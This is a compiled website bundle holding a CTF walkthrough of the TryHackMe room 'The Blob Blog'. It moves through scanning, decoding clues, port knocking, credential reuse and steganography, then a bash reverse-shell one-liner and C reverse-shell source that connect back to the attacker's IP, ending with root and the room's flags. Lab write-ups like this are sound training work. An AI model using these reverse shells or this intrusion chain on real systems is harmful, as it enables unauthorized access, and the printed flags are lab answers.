"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[1462],{3905:(t,e,n)=>{n.d(e,{Zo:()=>p,kt:()=>h});var r=n(67294);function s(t,e,n){return e in t?Object.defineProperty(t,e,{value:n,enumerable:!0,configurable:!0,writable:!0}):t[e]=n,t}function o(t,e){var n=Object.keys(t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(t);e&&(r=r.filter((function(e){return Object.getOwnPropertyDescriptor(t,e).enumerable}))),n.push.apply(n,r)}return n}function a(t){for(var e=1;e<arguments.length;e++){var n=null!=arguments[e]?arguments[e]:{};e%2?o(Object(n),!0).forEach((function(e){s(t,e,n[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(t,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(e){Object.defineProperty(t,e,Object.getOwnPropertyDescriptor(n,e))}))}return t}function i(t,e){if(null==t)return{};var n,r,s=function(t,e){if(null==t)return{};var n,r,s={},o=Object.keys(t);for(r=0;r<o.length;r++)n=o[r],e.indexOf(n)>=0||(s[n]=t[n]);return s}(t,e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(t);for(r=0;r<o.length;r++)n=o[r],e.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(t,n)&&(s[n]=t[n])}return s}var l=r.createContext({}),u=function(t){var e=r.useContext(l),n=e;return t&&(n="function"==typeof t?t(e):a(a({},e),t)),n},p=function(t){var e=u(t.components);return r.createElement(l.Provider,{value:e},t.children)},c="mdxType",d={inlineCode:"code",wrapper:function(t){var e=t.children;return r.createElement(r.Fragment,{},e)}},y=r.forwardRef((function(t,e){var n=t.components,s=t.mdxType,o=t.originalType,l=t.parentName,p=i(t,["components","mdxType","originalType","parentName"]),c=u(n),y=s,h=c["".concat(l,".").concat(y)]||c[y]||d[y]||o;return n?r.createElement(h,a(a({ref:e},p),{},{components:n})):r.createElement(h,a({ref:e},p))}));function h(t,e){var n=arguments,s=e&&e.mdxType;if("string"==typeof t||s){var o=n.length,a=new Array(o);a[0]=y;var i={};for(var l in e)hasOwnProperty.call(e,l)&&(i[l]=e[l]);i.originalType=t,i[c]="string"==typeof t?t:s,a[1]=i;for(var u=2;u<o;u++)a[u]=n[u];return r.createElement.apply(null,a)}return r.createElement.apply(null,n)}y.displayName="MDXCreateElement"},74969:(t,e,n)=>{n.r(e),n.d(e,{assets:()=>l,contentTitle:()=>a,default:()=>d,frontMatter:()=>o,metadata:()=>i,toc:()=>u});var r=n(87462),s=(n(67294),n(3905));const o={},a="The Blob Blog",i={unversionedId:"Tryhackme/The Blob Blog/The Blob Blog",id:"Tryhackme/The Blob Blog/The Blob Blog",title:"The Blob Blog",description:"Successfully hack into bobloblaw's computer",source:"@site/writeups/Tryhackme/The Blob Blog/The Blob Blog.md",sourceDirName:"Tryhackme/The Blob Blog",slug:"/Tryhackme/The Blob Blog/",permalink:"/writeups/Tryhackme/The Blob Blog/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Tempus Fugit Durius",permalink:"/writeups/Tryhackme/Tempus Fugit Durius/"},next:{title:"The Docker Rodeo",permalink:"/writeups/Tryhackme/The Docker Rodeo/"}},l={},u=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Root The Box",id:"task-1-root-the-box",level:2}],p={toc:u},c="wrapper";function d(t){let{components:e,...n}=t;return(0,s.kt)(c,(0,r.Z)({},p,n,{components:e,mdxType:"MDXLayout"}),(0,s.kt)("h1",{id:"the-blob-blog"},"The Blob Blog"),(0,s.kt)("p",null,"Successfully hack into bobloblaw's computer"),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/theblobblog"},"The Blob Blog")),(0,s.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,s.kt)("ul",null,(0,s.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,s.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,s.kt)("li",{parentName:"ul"},"Cryptography",(0,s.kt)("ul",{parentName:"li"},(0,s.kt)("li",{parentName:"ul"},"Base64"),(0,s.kt)("li",{parentName:"ul"},"Brainfuck"),(0,s.kt)("li",{parentName:"ul"},"Base58"),(0,s.kt)("li",{parentName:"ul"},"Vigen\xe8re"))),(0,s.kt)("li",{parentName:"ul"},"Port Knocking"),(0,s.kt)("li",{parentName:"ul"},"Stored Passwords & Keys"),(0,s.kt)("li",{parentName:"ul"},"FTP Enumeration"),(0,s.kt)("li",{parentName:"ul"},"Steganography"),(0,s.kt)("li",{parentName:"ul"},"Code Injection"),(0,s.kt)("li",{parentName:"ul"},"Rerverse Engineering")),(0,s.kt)("hr",null),(0,s.kt)("h2",{id:"task-1-root-the-box"},"Task 1 Root The Box"),(0,s.kt)("p",null,"Can you root the box?"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/The Blob Blog$ sudo nmap -A -sS -sC -sV -O 10.10.241.38\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 20:38 CEST\nNmap scan report for 10.10.241.38\nHost is up (0.038s latency).\nNot shown: 998 filtered ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   1024 e7:28:a6:33:66:4e:99:9e:8e:ad:2f:1b:49:ec:3e:e8 (DSA)\n|   2048 86:fc:ed:ce:46:63:4d:fd:ca:74:b6:50:46:ac:33:0f (RSA)\n|   256 e0:cc:05:0a:1b:8f:5e:a8:83:7d:c3:d2:b3:cf:91:ca (ECDSA)\n|_  256 80:e3:45:b2:55:e2:11:31:ef:b1:fe:39:a8:90:65:c5 (ED25519)\n80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))\n|_http-server-header: Apache/2.4.7 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: specialized|storage-misc\nRunning (JUST GUESSING): Crestron 2-Series (87%), HP embedded (85%)\nOS CPE: cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3\nAggressive OS guesses: Crestron XPanel control system (87%), HP P2000 G3 NAS device (85%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT      ADDRESS\n1   36.52 ms 10.8.0.1\n2   37.22 ms 10.10.241.38\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 22.59 seconds\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/The Blob Blog$ sudo /opt/dirsearch/dirsearch.py -u 10.10.241.38 -w /usr/share/wordlists/dirb/common.txt -e html,php\n[sudo] password for kali:\n\n  _|. _ _  _  _  _ _|_    v0.4.0\n (_||| _) (/_(_|| (_| )\n\nExtensions: html, php | HTTP method: GET | Threads: 20 | Wordlist size: 4613\n\nError Log: /opt/dirsearch/logs/errors-20-10-14_20-40-43.log\n\nTarget: 10.10.241.38\n\nOutput File: /opt/dirsearch/reports/10.10.241.38/_20-10-14_20-40-43.txt\n\n[20:40:43] Starting:\n[20:40:49] 200 -   13KB - /index.html\n[20:40:53] 403 -  292B  - /server-status\n\nTask Completed\n")),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"view-source:http://10.10.241.38/"},"view-source:http://10.10.241.38/")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"\x3c!--\nK1stLS0+Kys8XT4rLisrK1stPisrKys8XT4uLS0tLisrKysrKysrKy4tWy0+KysrKys8XT4tLisrKytbLT4rKzxdPisuLVstPisrKys8XT4uLS1bLT4rKysrPF0+LS4tWy0+KysrPF0+LS4tLVstLS0+KzxdPi0tLitbLS0tLT4rPF0+KysrLlstPisrKzxdPisuLVstPisrKzxdPi4tWy0tLT4rKzxdPisuLS0uLS0tLS0uWy0+KysrPF0+Li0tLS0tLS0tLS0tLS4rWy0tLS0tPis8XT4uLS1bLS0tPis8XT4uLVstLS0tPis8XT4rKy4rK1stPisrKzxdPi4rKysrKysrKysrKysuLS0tLS0tLS0tLi0tLS0uKysrKysrKysrLi0tLS0tLS0tLS0uLS1bLS0tPis8XT4tLS0uK1stLS0tPis8XT4rKysuWy0+KysrPF0+Ky4rKysrKysrKysrKysrLi0tLS0tLS0tLS0uLVstLS0+KzxdPi0uKysrK1stPisrPF0+Ky4tWy0+KysrKzxdPi4tLVstPisrKys8XT4tLi0tLS0tLS0tLisrKysrKy4tLS0tLS0tLS0uLS0tLS0tLS0uLVstLS0+KzxdPi0uWy0+KysrPF0+Ky4rKysrKysrKysrKy4rKysrKysrKysrKy4tWy0+KysrPF0+LS4rWy0tLT4rPF0+KysrLi0tLS0tLS4rWy0tLS0+KzxdPisrKy4tWy0tLT4rKzxdPisuKysrLisuLS0tLS0tLS0tLS0tLisrKysrKysrLi1bKys+LS0tPF0+Ky4rKysrK1stPisrKzxdPi4tLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+LlstLS0+Kys8XT4tLS4rKysrK1stPisrKzxdPi4tLS0tLS0tLS0uWy0tLT4rPF0+LS0uKysrKytbLT4rKys8XT4uKysrKysrLi0tLS5bLS0+KysrKys8XT4rKysuK1stLS0tLT4rPF0+Ky4tLS0tLS0tLS0uKysrKy4tLS4rLi0tLS0tLS4rKysrKysrKysrKysrLisrKy4rLitbLS0tLT4rPF0+KysrLitbLT4rKys8XT4rLisrKysrKysrKysrLi4rKysuKy4rWysrPi0tLTxdPi4rK1stLS0+Kys8XT4uLlstPisrPF0+Ky5bLS0tPis8XT4rLisrKysrKysrKysrLi1bLT4rKys8XT4tLitbLS0tPis8XT4rKysuLS0tLS0tLitbLS0tLT4rPF0+KysrLi1bLS0tPisrPF0+LS0uKysrKysrKy4rKysrKysuLS0uKysrK1stPisrKzxdPi5bLS0tPis8XT4tLS0tLitbLS0tLT4rPF0+KysrLlstLT4rKys8XT4rLi0tLS0tLi0tLS0tLS0tLS0tLS4tLS1bLT4rKysrPF0+Li0tLS0tLS0tLS0tLS4tLS0uKysrKysrKysrLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+Li0tLS0tLS0uLS0tLS0tLS0tLS0tLi0tLVstPisrKys8XT4uLS0tLS0tLS0tLS0tLi0tLS4rKysrKysrKysuLVstPisrKysrPF0+LS4tLS0tLVstPisrPF0+LS4tLVstLS0+Kys8XT4tLg==\n--\x3e\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"When I was a kid, my friends and I would always knock on 3 of our neighbors doors. Always houses 1, then 3, then 5!")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-html"},"\x3c!--\nDang it Bob, why do you always forget your password?\nI'll encode for you here so nobody else can figure out what it is: \nHcfP8J54AK4\n--\x3e\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"cUpC4k3s")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"for x in 1 3 5; do nc -w 1 -z 10.10.241.38 $x; done")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/The Blob Blog$ sudo nmap -A -sS -sC -sV -O 10.10.241.38\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 20:48 CEST\nNmap scan report for 10.10.241.38\nHost is up (0.037s latency).\nNot shown: 995 closed ports\nPORT     STATE SERVICE VERSION\n21/tcp   open  ftp     vsftpd 3.0.2\n22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   1024 e7:28:a6:33:66:4e:99:9e:8e:ad:2f:1b:49:ec:3e:e8 (DSA)\n|   2048 86:fc:ed:ce:46:63:4d:fd:ca:74:b6:50:46:ac:33:0f (RSA)\n|   256 e0:cc:05:0a:1b:8f:5e:a8:83:7d:c3:d2:b3:cf:91:ca (ECDSA)\n|_  256 80:e3:45:b2:55:e2:11:31:ef:b1:fe:39:a8:90:65:c5 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))\n|_http-server-header: Apache/2.4.7 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\n445/tcp  open  http    Apache httpd 2.4.7 ((Ubuntu))\n|_http-server-header: Apache/2.4.7 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\n8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.5.3)\n|_http-server-header: Werkzeug/1.0.1 Python/3.5.3\n|_http-title: Apache2 Ubuntu Default Page: It works\nAggressive OS guesses: Crestron XPanel control system (92%), ASUS RT-N56U WAP (Linux 3.4) (92%), Linux 3.16 (92%), Linux 3.10 - 3.13 (90%), Linux 4.10 (89%), Linux 3.1 (89%), Linux 3.2 (89%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (88%), Vodavi XTS-IP PBX (87%), Epson Stylus Pro 400 printer (86%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_smb2-time: Protocol negotiation failed (SMB2)\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT      ADDRESS\n1   36.37 ms 10.8.0.1\n2   36.44 ms 10.10.241.38\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 81.13 seconds\n")),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"view-source:http://10.10.241.38:445/"},"view-source:http://10.10.241.38:445/")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-html"},"\x3c!--\nBob, I swear to goodness, if you can't remember p@55w0rd \nIt's not that hard\n--\x3e\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/The Blob Blog$ gobuster dir -u http://10.10.241.38:445/ -w /usr/share/wordlists/dirb/common.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.241.38:445/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirb/common.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/10/14 20:52:14 Starting gobuster\n===============================================================\n/.hta (Status: 403)\n/.htaccess (Status: 403)\n/.htpasswd (Status: 403)\n/index.html (Status: 200)\n/server-status (Status: 403)\n/user (Status: 200)\n===============================================================\n2020/10/14 20:52:33 Finished\n===============================================================\n")),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"view-source:http://10.10.241.38:445/user"},"view-source:http://10.10.241.38:445/user")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"bob:cUpC4k3s")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/The Blob Blog$ ftp 10.10.241.38\nConnected to 10.10.241.38.\n220 (vsFTPd 3.0.2)\nName (10.10.241.38:kali): bob\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\n-rw-r--r--    1 1001     1001         8980 Jul 25 14:07 examples.desktop\ndr-xr-xr-x    3 65534    65534        4096 Jul 25 14:08 ftp\n226 Directory send OK.\nftp> cd ftp\n250 Directory successfully changed.\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    2 1001     1001         4096 Jul 28 16:05 files\n226 Directory send OK.\nftp> cd files\n250 Directory successfully changed.\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\n-rw-r--r--    1 1001     1001         8183 Jul 28 16:05 cool.jpeg\n226 Directory send OK.\nftp> get cool.jpeg\nlocal: cool.jpeg remote: cool.jpeg\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for cool.jpeg (8183 bytes).\n226 Transfer complete.\n8183 bytes received in 0.14 secs (57.7721 kB/s)\nftp>\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/The Blob Blog$ steghide extract -sf cool.jpeg\nEnter passphrase:\nwrote extracted data to "out.txt".\nkali@kali:~/CTFs/tryhackme/The Blob Blog$ cat out.txt\nzcv:p1fd3v3amT@55n0pr\n/bobs_safe_for_stuff\n')),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"http://10.10.241.38:445/bobs_safe_for_stuff"},"http://10.10.241.38:445/bobs_safe_for_stuff")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"Remember this next time bob, you need it to get into the blog! I'm taking this down tomorrow, so write it down!\n- youmayenter\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"bob:d1ff3r3ntP@55w0rd")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/The Blob Blog$ gobuster dir -u http://10.10.241.38:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.241.38:8080/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/10/14 21:00:45 Starting gobuster\n===============================================================\n/blog (Status: 302)\n/login (Status: 200)\n/review (Status: 302)\n/blog1 (Status: 200)\n/blog2 (Status: 200)\n/blog3 (Status: 200)\nProgress: 33913 / 220561 (15.38%)^C\n[!] Keyboard interrupt detected, terminating.\n===============================================================\n2020/10/14 21:05:59 Finished\n===============================================================\n")),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"http://10.10.130.138:8080/blog"},"http://10.10.130.138:8080/blog")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"bob:d1ff3r3ntP@55w0rd")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"bash -i >& /dev/tcp/10.8.106.222/9001 0>&1")),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"http://10.10.130.138:8080/review"},"http://10.10.130.138:8080/review")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"www-data@bobloblaw-VirtualBox:~/html2$ /usr/bin/blogFeedback 6 5 4 3 2 1\n/usr/bin/blogFeedback 6 5 4 3 2 1\nwhoami\nbobloblaw\ncd /home/bobloblaw\nls\nDesktop\nDocuments\nDownloads\nexamples.desktop\nMusic\nPictures\nPublic\nTemplates\nVideos\ncd Desktop\nls\ndontlookatthis.jpg\nlookatme.jpg\nuser.txt\ncat user.txt\nTHM{C0NGR4t$_g3++ing_this_fur}\n\n@jakeyee thank you so so so much for the help with the foothold on the box!!\n")),(0,s.kt)("p",null,"ls -la\ntotal 16\ndrwxr-xr-x 3 bobloblaw bobloblaw 4096 Jul 30 09:33 .\ndrwxrwx--- 16 bobloblaw bobloblaw 4096 Aug 6 14:51 ..\ndrwxrwx--- 2 bobloblaw bobloblaw 4096 Oct 25 11:06 .also_boring\n-rw-rw---- 1 bobloblaw bobloblaw 92 Jul 30 09:33 .boring_file.c"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-cpp"},'#include <stdio.h>\n#include <unistd.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n\nint main (int argc, char **argv)\n{\n  int scktd;\n  struct sockaddr_in client;\n\n  client.sin_family = AF_INET;\n  client.sin_addr.s_addr = inet_addr("10.8.106.222");\n  client.sin_port = htons(9002);\n\n  scktd = socket(AF_INET,SOCK_STREAM,0);\n  connect(scktd,(struct sockaddr *)&client,sizeof(client));\n\n  dup2(scktd,0); // STDIN\n  dup2(scktd,1); // STDOUT\n  dup2(scktd,2); // STDERR\n\n  execl("/bin/sh","sh","-i",NULL,NULL);\n\n  return 0;\n}\n')),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/The Blob Blog$ nc -lnvp 9002\nListening on 0.0.0.0 9002\nConnection received on 10.10.130.138 56316\nsh: 0: can't access tty; job control turned off\n# id\nuid=0(root) gid=0(root) groups=0(root)\n# cat /root/root.txt\nTHM{G00D_J0B_G3++1NG+H3R3!}\n")),(0,s.kt)("ol",null,(0,s.kt)("li",{parentName:"ol"},"User Flag")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"THM{C0NGR4t$_g3++ing_this_fur}")),(0,s.kt)("ol",{start:2},(0,s.kt)("li",{parentName:"ol"},"Root Flag")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"THM{G00D_J0B_G3++1NG+H3R3!}")))}d.isMDXComponent=!0}}]);